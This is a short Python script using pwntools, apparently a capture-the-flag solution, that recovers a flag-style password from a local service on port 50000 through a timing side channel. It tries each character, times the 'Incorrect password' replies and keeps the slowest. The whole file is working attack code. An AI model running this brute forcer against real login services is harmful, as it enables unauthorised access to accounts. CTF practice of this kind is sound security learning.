#!/usr/bin/env python3

import string
import time
from pwn import *

HOST = 'localhost'
PORT = 50000

def attempt(io, password):
    io.recvline_contains(b'Input password:')
    t0 = time.time()
    io.sendline(password.encode())
    io.recvuntil(b'Incorrect password!')
    t1 = time.time()
    return t1-t0

io = remote(HOST, PORT, level='warning')

flag = ''
ALPHABET = '/%${}_' + string.ascii_letters + string.digits
SAMPLES = 3
with log.progress('Finding password') as p:
    while not flag.endswith('}'):
        best = None
        best_t = 0
        for c in ALPHABET:
            p.status(f'best: {best}/{best_t:.05f}, trying: {c}, flag: {flag}')
            cand = flag + c + 'A'*10
            dts = [attempt(io, cand) for _ in range(SAMPLES)]
            #dt = sorted(dts)[(SAMPLES+1)//2] # median
            dt = sum(dts) # sum/avg
            if dt > best_t:
                best = c
                best_t = dt
        if best == None:
            p.failure('Failed to find password')
            break
        flag += best
        p.status(f'dt: {best_t:.05f}, flag: {flag}')
    p.success(flag)
